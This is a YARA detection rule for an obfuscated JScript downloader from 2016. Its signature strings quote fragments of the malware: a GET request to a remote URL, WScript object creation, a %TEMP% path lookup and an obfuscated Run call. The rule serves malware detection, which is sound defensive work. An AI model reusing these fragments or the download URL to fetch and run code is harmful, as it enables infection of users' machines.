rule sig_20160428_91a4cd43bd790b1f6b890e8ca44bd8e6 {
  meta:
    description = "datamaliciousorder - file 20160428_91a4cd43bd790b1f6b890e8ca44bd8e6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5269ab39fbc838315722c8be533b92e98ee290a7844f4abe14b6c48509cfee90"

  strings:
    $s1  = "HnfQycXekHcfOroPgtRvc[VoqJcgYctLeuWilLwgOys](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s2  = "function VeoTytEihQsmZvdLjtYub() {return OuqHowVgcXouXtgJpyKuq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function SwsHcnFvySdeGbyNdpSdg(NptKxcSokKcuNsqQysHnr){OuqHowVgcXouXtgJpyKuq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function SwsHcnFvySdeGbyNdpSdg(NptKxcSokKcuNsqQysHnr){OuqHowVgcXouXtgJpyKuq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "var OuqHowVgcXouXtgJpyKuq = function ZcuMcgLhyUtwRfrIpkAxl() {return XxoKpxAwmMajEmhAzwScm[KhpTmqMkqGxnMawJrnStm](\"WScript\"+\"" ascii
    $s6  = "return GmdHslPzsBsaBzcPvlTzt - UstPivXmmZgmZvjJufGsb;};" fullword ascii
    $s7  = "function CxvTyyGbxOeoBiuWjdLqv(GmdHslPzsBsaBzcPvlTzt, UstPivXmmZgmZvjJufGsb){HklQaiJvtCmoHsgBbhScm = HklQaiJvtCmoHsgBbhScm * 1; " ascii
    $s8  = "var XxoKpxAwmMajEmhAzwScm = this[\"WScript\"];" fullword ascii
    $s9  = "var OuqHowVgcXouXtgJpyKuq = function ZcuMcgLhyUtwRfrIpkAxl() {return XxoKpxAwmMajEmhAzwScm[KhpTmqMkqGxnMawJrnStm](\"WScript\"+\"" ascii
    $s10 = "function VeoTytEihQsmZvdLjtYub() {return OuqHowVgcXouXtgJpyKuq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function ZfxUjyNurVhdKioSdvIjt(){return EkzAypCbmAbxBczXyvAqn + \"\";};" fullword ascii
    $s12 = "function CxvTyyGbxOeoBiuWjdLqv(GmdHslPzsBsaBzcPvlTzt, UstPivXmmZgmZvjJufGsb){HklQaiJvtCmoHsgBbhScm = HklQaiJvtCmoHsgBbhScm * 1; " ascii
    $s13 = "if (HnfQycXekHcfOroPgtRvc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function JmiXhsQmhMvxRlbEhcFdg() {return ((TjrZbnKrqWnuNkrArsIvj == true) && (TjrZbnKrqWnuNkrArsIvj == ZlsPgnDziUpvYilMtoJky)) ?" ascii
    $s15 = "return CxvTyyGbxOeoBiuWjdLqv(1 == 1 ? AuuPaaPuqFmtMalByhPmr : 0, 1 == 1 ? XvoUkmPcoMngPjjEybGxb : 0);" fullword ascii
    $s16 = "function JmiXhsQmhMvxRlbEhcFdg() {return ((TjrZbnKrqWnuNkrArsIvj == true) && (TjrZbnKrqWnuNkrArsIvj == ZlsPgnDziUpvYilMtoJky)) ?" ascii
    $s17 = "var TjrZbnKrqWnuNkrArsIvj = false;" fullword ascii
    $s18 = "function QfkTusQdxAkfFjzGiuIea(LsfLpgIbhRdbTauAbwAfk) {var TyyOprImiGhyIbgOriPme = (1, 2, 3, 4, 5, LsfLpgIbhRdbTauAbwAfk); retur" ascii
    $s19 = "var ZlsPgnDziUpvYilMtoJky = false;" fullword ascii
    $s20 = "function FosKciBhfMlnRblNgzTsp()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}